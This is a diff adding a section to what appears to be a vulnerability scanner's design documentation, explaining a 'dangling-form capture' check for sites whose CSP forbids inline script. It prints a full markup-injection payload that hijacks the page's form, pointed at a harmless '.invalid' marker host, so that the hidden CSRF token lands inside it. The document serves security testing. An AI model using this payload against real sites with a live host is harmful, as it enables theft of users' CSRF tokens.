@@ -668,6 +668,31 @@ gate, both shapes, the runtime semantics and the Angular-free RED control are
 pinned by `internal/scan/angular_csp_bypass_integration_test.go`.
 
 
+### Dangling-form capture (`dangling_form_capture`)
+
+When the policy forbids inline script, script execution cannot prove an
+injection — but markup still can. At a quoted attribute value the value can
+close the attribute, the element, and the page's OWN form, then open a form whose
+action carries the scan's marker:
+
+```
+"></form><form action="https://<marker>.invalid/log" method="GET"><input type="submit" value="Click">
+```
+
+Everything the page renders after the injection point — its hidden CSRF input in
+particular — is parsed as a CHILD of that form. The verifier reads exactly that
+from the DOM (`SignalDOMFormCapture`): a form whose action carries the marker,
+holding an input whose value the request never contained. Reflection alone
+cannot produce it, and nothing is submitted: the action uses the reserved
+`.invalid` TLD, so no request leaves the browser.
+
+Gated on `CSPForbidsInline` (exported from the same CSP parser) and on a
+double-quoted (or unproven) attribute value, so a site proven to use single
+quotes never receives a payload it cannot break out of. Measured against a
+loopback lab (`internal/scan/dangling_markup_integration_test.go`: broken parse
+Confirms, encoded control does not) and against PortSwigger's "very strict CSP"
+dangling-markup lab.
+
 ### CSP report-uri parameter injection (`csp_directive_injection`)
 
 A policy that reports violations names a URL in its own header:
